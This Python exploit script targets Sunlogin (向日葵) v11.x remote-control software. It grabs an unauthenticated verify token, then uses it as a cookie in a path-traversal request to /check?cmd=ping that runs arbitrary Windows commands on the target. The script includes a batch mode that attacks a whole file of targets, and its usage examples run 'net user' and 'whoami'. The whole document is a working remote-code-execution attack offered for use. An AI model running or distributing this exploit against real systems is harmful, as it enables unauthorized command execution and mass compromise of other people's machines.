from optparse import OptionParser
import requests
import json


def title():
    print("""
        
╔═╗┬ ┬┌┐┌╦  ┌─┐┌─┐┬┌┐┌   ╦═╗┌─┐┌─┐
╚═╗│ ││││║  │ ││ ┬││││───╠╦╝│  ├┤   =.=
╚═╝└─┘┘└┘╩═╝└─┘└─┘┴┘└┘   ╩╚═└─┘└─┘
						    By:J2ekim
						    向日葵v11.x RCE
        """)


def gettoken(ip, port):
    print("http://" + ip + ":" + port)
    url = "http://" + ip + ":" + port + "/cgi-bin/rpc?action=verify-haras"
    try:
        res = json.loads(requests.get(url,verify=False, timeout=5).text)
        # print(res['verify_string'])
        return res['verify_string']
    except requests.exceptions.ConnectTimeout as _:
        print ("fail", "ConnectTimeout")
    except Exception as _:
        print ("fail", "Error")


def RunCmd(ip, port, command,token):
    poc1 = "http://" + ip + ":" + port + "/check?cmd=ping../../../../../../windows/system32/" + command
    # poc1 = "http://" + ip + ":" + port + "/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+"+ cmd
    cookies = {"CID": token}
    # print(cookies)
    try:
        resu = requests.get(poc1, cookies=cookies, timeout=5,verify=False).text
        print(resu)
    except Exception as _:
        return ("fail", "Error_")


def getshell(url,command):
    try:
        print(url)
        vul_url = url + "/cgi-bin/rpc?action=verify-haras"
        reps = json.loads(requests.get(vul_url, verify=False, timeout=5).text)
        verify_string = (reps['verify_string'])
        cookies = {"CID": verify_string}
        poc11 = url + "/check?cmd=ping../../../../../../windows/system32/" + command
        poc_reps = requests.get(poc11, cookies=cookies, timeout=5, verify=False).text
        print(poc_reps)
    except TimeoutError:
        print("timeout")
    except Exception:
        print("error")


def batch_getshell(filename,command):
    with open(filename, mode="r", encoding="utf-8") as f:
        for url in f:
            if "http" not in url:
                url = "http://" + url
                getshell(url,command)
            else:
                getshell(url, command)


def main(host,port,command):
    try:
        token = gettoken(host, port)
        RunCmd(host, port, command, token)

    except requests.RequestException as e:
        print(e)


if __name__ == '__main__':
    title()
    usage = ("""Usage: python exp.py -i [--host] -p [--port] -c [--command] -f [--file]
             python exp.py -i 127.0.0.1 -p 20038 -c "net user" 
             python exp.py  -f targets.txt -c "whoami" """)
    parser = OptionParser(usage=usage)
    parser.add_option('-i', '--ip', dest='ip')
    parser.add_option('-p', '--port', dest='port')
    parser.add_option('-c', '--command', dest='command')
    parser.add_option('-f', '--file', dest='file')
    (option, args) = parser.parse_args()
    host = option.ip
    port = option.port
    command = option.command
    file = option.file
    if host is None and command is None and port is None :
        print(usage)
    elif file is not None:
        batch_getshell(file,command)
    else:
        main(host, port,command)
